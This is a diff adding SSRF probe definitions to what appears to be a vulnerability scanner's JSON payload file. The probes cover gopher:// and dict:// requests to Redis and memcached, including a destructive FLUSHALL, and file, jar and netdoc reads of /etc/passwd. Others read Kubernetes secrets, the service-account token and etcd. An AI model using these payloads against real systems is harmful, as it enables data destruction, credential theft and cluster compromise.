@@ -434,6 +434,148 @@
           "variables": {}
         }
       ]
+    },
+    "protocol_smuggling": {
+      "description": "Non-HTTP URI schemes that some HTTP clients still resolve. gopher:// is the king for raw-byte cross-protocol attacks (Redis, memcached, MySQL, SMTP). Java URL.openConnection accepts ftp://, file://, jar://, netdoc:// historically. PHP allows phar://, expect://, glob://. Curl's -L follows file:// across redirects.",
+      "tech_match": ["java", "php", "curl"],
+      "param_match": ["url", "uri", "callback", "redirect", "fetch", "endpoint"],
+      "probes": [
+        {
+          "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+          "description": "gopher:// to Redis 6379 \u2014 sends raw RESP-protocol bytes via HTTP-style fetch. flushall is destructive; replace with INFO for safety. Confirm by issuing a benign command first (Rule 5).",
+          "matchers": [
+            {"type": "word", "any": ["redis_version", "+OK", "PONG"]},
+            {"type": "timing", "min_ms": 100}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"safety_note": "use INFO/PING, not FLUSHALL"}
+        },
+        {
+          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
+          "description": "gopher:// to memcached 11211 \u2014 STATS command. Output dumps server stats and key prefixes.",
+          "matchers": [
+            {"type": "word", "any": ["STAT pid", "STAT version", "END"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "dict://127.0.0.1:11211/stats",
+          "description": "dict:// scheme to memcached. Curl-style libs accept dict://. Less stealthy than gopher but no encoding required.",
+          "matchers": [
+            {"type": "word", "any": ["STAT", "VERSION"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "file:///etc/passwd",
+          "description": "file:// scheme \u2014 Java URL.openConnection, PHP file_get_contents, Python urllib accept this. /etc/passwd content confirms file read.",
+          "matchers": [
+            {"type": "word", "any": ["root:x:0:0", "daemon:"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "jar:file:///etc/passwd!/",
+          "description": "jar: scheme on Java \u2014 file:// inside a jar URI. Some Java HTTP clients still resolve.",
+          "matchers": [
+            {"type": "word", "any": ["root:x:0:0"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "netdoc:///etc/passwd",
+          "description": "netdoc: legacy Java scheme that resolves like file://. Many WAFs miss it.",
+          "matchers": [
+            {"type": "word", "any": ["root:x:0:0"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "phar:///tmp/test.phar/file.txt",
+          "description": "PHP phar:// triggers unserialize on .phar metadata \u2014 distinct attack path from raw read. Useful when file_get_contents is filtered for file://.",
+          "matchers": [
+            {"type": "word", "any": ["unserialize", "phar"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "dns_rebinding_advanced": {
+      "description": "DNS rebinding 2024+ variants. Classic A-record TTL-0 swap is well-known; new vectors abuse SVCB/HTTPS records (RFC 9460) and WebRTC ICE candidate disclosure.",
+      "tech_match": [],
+      "param_match": ["url", "host", "callback"],
+      "probes": [
+        {
+          "payload": "http://attacker-rebind.collaborator.example/",
+          "description": "[Manual] DNS rebind: attacker domain returns public IP first, 127.0.0.1 / 169.254.169.254 second. Apps that re-resolve between TOCTOU validation and fetch hit internal target.",
+          "matchers": [
+            {"type": "word", "any": ["ami-id", "instance-identity", "iam"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"manual_chain": true, "COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] SVCB / HTTPS resource records (RFC 9460): attacker DNS returns SVCB pointing at internal IP via 'ipv4hint'/'ipv6hint'. HTTP clients that prefer SVCB without re-validating get redirected internally.",
+          "matchers": [
+            {"type": "word", "any": ["169.254", "127.0.0.1", "metadata"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "k8s_in_cluster_pivot": {
+      "description": "SSRF inside a Kubernetes pod has direct line-of-sight to: kubelet (10250), etcd (2379/2380), kube-apiserver (6443), service-account-token at /var/run/secrets/kubernetes.io/serviceaccount/token. Cluster-compromise primitive.",
+      "tech_match": ["kubernetes", "k8s"],
+      "param_match": ["url"],
+      "probes": [
+        {
+          "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
+          "description": "kube-apiserver via in-cluster DNS. If pod has default service account with secrets read, attacker dumps cluster secrets.",
+          "matchers": [
+            {"type": "word", "any": ["SecretList", "kind\":\"Secret", "data\":"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75
+        },
+        {
+          "payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+          "description": "Service-account JWT token \u2014 used to authenticate to kube-apiserver. Combine with API call to escalate.",
+          "matchers": [
+            {"type": "regex", "pattern": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\."}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75
+        },
+        {
+          "payload": "https://127.0.0.1:10250/pods",
+          "description": "kubelet pods endpoint \u2014 if anonymous-auth enabled (older clusters), lists every pod on the node + container metadata.",
+          "matchers": [
+            {"type": "word", "any": ["PodList", "containerStatuses"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "http://127.0.0.1:2379/v2/keys/?recursive=true",
+          "description": "etcd v2 API \u2014 dumps the entire cluster key/value store including all Kubernetes objects. Modern etcd uses v3 gRPC, but legacy clusters expose v2 HTTP.",
+          "matchers": [
+            {"type": "word", "any": ["nodes\":", "createdIndex"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
     }
   }
 }
